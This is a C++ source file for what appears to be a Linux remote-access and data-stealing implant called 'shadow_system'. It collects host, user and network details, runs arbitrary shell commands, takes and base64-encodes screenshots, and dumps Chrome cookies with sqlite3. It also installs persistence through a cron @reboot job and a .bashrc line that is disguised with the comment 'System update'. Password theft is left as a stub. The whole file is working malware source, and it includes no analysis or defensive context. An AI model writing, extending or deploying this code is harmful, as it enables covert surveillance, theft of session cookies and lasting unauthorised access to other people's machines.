#include "system_info.hpp"
#include <unistd.h>
#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <ifaddrs.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fstream>
#include <sstream>
#include <json/json.h>
#include <X11/Xlib.h>
#include <X11/extensions/XTest.h>
#include <X11/keysym.h>

namespace shadow_system {

SystemInfo get_system_info() {
    SystemInfo info;
    
    char hostname[256];
    gethostname(hostname, 256);
    info.hostname = hostname;
    
    char* user = getlogin();
    info.username = user ? user : "unknown";
    
    struct utsname uname_data;
    uname(&uname_data);
    info.os_name = std::string(uname_data.sysname) + " " + uname_data.release;
    
    info.cpu_count = sysconf(_SC_NPROCESSORS_ONLN);
    
    struct sysinfo si;
    sysinfo(&si);
    info.memory_total = si.totalram;
    info.memory_used = si.totalram - si.freeram;
    
    char cwd[1024];
    getcwd(cwd, sizeof(cwd));
    info.cwd = cwd;
    
    info.pid = getpid();
    
    // Network interfaces
    struct ifaddrs* ifaddr;
    if (getifaddrs(&ifaddr) == 0) {
        for (struct ifaddrs* ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
            if (ifa->ifa_addr && ifa->ifa_addr->sa_family == AF_INET) {
                std::map<std::string, std::string> iface;
                iface["name"] = ifa->ifa_name;
                struct sockaddr_in* sin = (struct sockaddr_in*)ifa->ifa_addr;
                char ip[INET_ADDRSTRLEN];
                inet_ntop(AF_INET, &sin->sin_addr, ip, INET_ADDRSTRLEN);
                iface["ip"] = ip;
                info.network_interfaces.push_back(iface);
            }
        }
        freeifaddrs(ifaddr);
    }
    
    return info;
}

std::string execute_shell(const std::string& command) {
    std::array<char, 4096> buffer;
    std::string result;
    
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) return "{\"error\":\"popen failed\"}";
    
    while (fgets(buffer.data(), buffer.size(), pipe) != nullptr) {
        result += buffer.data();
    }
    
    int status = pclose(pipe);
    
    Json::Value json;
    json["stdout"] = result;
    json["returncode"] = WEXITSTATUS(status);
    
    return json.toStyledString();
}

std::string get_processes() {
    std::string cmd = "ps aux --no-headers | head -100";
    return execute_shell(cmd);
}

std::string take_screenshot() {
    // Usar ImageMagick import
    std::string filename = "/tmp/ss_cpp_" + std::to_string(time(nullptr)) + ".png";
    std::string cmd = "import -window root " + filename;
    system(cmd.c_str());
    
    // Leer archivo y codificar en base64
    std::ifstream file(filename, std::ios::binary);
    if (!file) return "{\"error\":\"screenshot failed\"}";
    
    std::vector<unsigned char> buffer((std::istreambuf_iterator<char>(file)),
                                       std::istreambuf_iterator<char>());
    file.close();
    remove(filename.c_str());
    
    // Base64 encoding simple
    static const char* chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string encoded;
    int val = 0, valb = -6;
    for (unsigned char c : buffer) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            encoded.push_back(chars[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) encoded.push_back(chars[((val << 8) >> (valb + 8)) & 0x3F]);
    while (encoded.size() % 4) encoded.push_back('=');
    
    Json::Value json;
    json["image_data"] = encoded;
    return json.toStyledString();
}

std::string extract_cookies() {
    // Chrome cookies
    std::string home = getenv("HOME");
    std::string chrome_cookies = home + "/.config/google-chrome/Default/Cookies";
    
    std::string cmd = "sqlite3 \"" + chrome_cookies + "\" \"SELECT host_key, name, value FROM cookies LIMIT 20\" 2>/dev/null";
    std::string result = execute_shell(cmd);
    
    Json::Value json;
    json["chrome"] = result;
    return json.toStyledString();
}

std::string extract_passwords() {
    Json::Value json;
    json["note"] = "Password extraction requires Chrome decryption key";
    json["status"] = "not implemented in demo";
    return json.toStyledString();
}

bool establish_persistence() {
    std::string home = getenv("HOME");
    
    // Cron
    std::string cron_cmd = "(crontab -l 2>/dev/null; echo '@reboot /usr/local/bin/shadow-update') | crontab -";
    system(cron_cmd.c_str());
    
    // Bashrc
    std::string bashrc = home + "/.bashrc";
    std::ofstream file(bashrc, std::ios::app);
    if (file) {
        file << "\n# System update\n/usr/local/bin/shadow-update &>/dev/null &\n";
        file.close();
    }
    
    return true;
}

} // namespace shadow_system
